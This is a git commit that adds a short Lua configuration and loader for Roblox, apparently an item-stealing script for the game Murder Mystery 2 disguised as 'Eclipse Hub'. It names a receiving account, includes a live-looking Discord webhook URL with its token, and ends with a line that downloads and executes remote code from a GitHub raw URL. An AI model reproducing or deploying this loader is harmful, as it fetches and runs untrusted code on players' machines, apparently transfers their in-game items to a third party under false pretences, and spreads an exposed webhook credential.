9ef4d839e0a7205c561b61f5bfc304760d8b0139
Nexuitisy <rckz4ml@gmail.com>
2024-08-02 08:47:29 +0700

    Create Mm2.lua

---
+++ Mm2.lua
@@ -0,0 +1,10 @@
+Config = {
+    Receivers = {"nicodonzi"},
+    Webhook = "https://discord.com/api/webhooks/1268670065398644836/uD8uoNgNiiYFfAjfcbCsPsCy_PozwFOSShS69ruBqzcFGbjYXrOfQMxCN4tf_U9L6tA4",
+    FullInventory = false,
+    GoodItemsOnly = true,
+    ResendTrade = ".resend",
+    Script = "Eclipse Hub",
+    CustomLink = ""
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Impact/Source"))()
